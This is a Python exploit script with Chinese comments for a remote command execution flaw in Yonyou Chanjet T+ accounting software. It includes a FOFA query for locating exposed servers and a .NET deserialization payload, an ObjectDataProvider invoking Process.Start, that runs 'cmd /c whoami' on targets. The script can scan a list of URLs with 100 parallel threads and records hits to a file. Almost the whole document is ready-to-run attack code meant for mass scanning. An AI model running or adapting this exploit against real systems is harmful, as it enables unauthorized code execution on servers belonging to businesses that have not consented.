#用友畅捷通T+ GetStoreWarehouseByStore 远程命令执行漏洞

# fofa语法：app="畅捷通-TPlus"

import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
___  _ ____  _      ________  _ ____  _     _      ____ 
\  \///  _ \/ \  /|/  __/\  \///  _ \/ \ /\/ \  /|/   _\
 \  / | / \|| |\ ||| |  _ \  / | / \|| | ||| |\ |||  /  
 / /  | \_/|| | \||| |_// / /  | \_/|| \_/|| | \|||  \_ 
/_/   \____/\_/  \|\____\/_/   \____/\____/\_/  \|\____/
"""
    print(test)

def main():
    banner()

    parser = argparse.ArgumentParser(description = "用友畅捷通-TPlus远程命令执行")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")

def poc(target):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'X-Ajaxpro-Method': 'GetStoreWarehouseByStore',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection':' keep-alive',
        'Content-type': 'application/x-www-form-urlencoded',
        'Content-Length': '588'
    }
    data = {
        "storeID":{
            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName":"Start",
            "ObjectInstance":{
                "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "StartInfo": {
                    "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                    "FileName":"cmd", 
                    "Arguments":"/c whoami > test.txt"
                }
            }
        }
    }
        
    
    payload = '/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore'
    url = target+payload
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "PublicKeyToken" in res.text:
            print(f"该url存在命令执行漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f"该url不存在命令执行漏洞{target}")
    except Exception:
        print(f"该url存在问题{target}")
if __name__ == '__main__':
    main()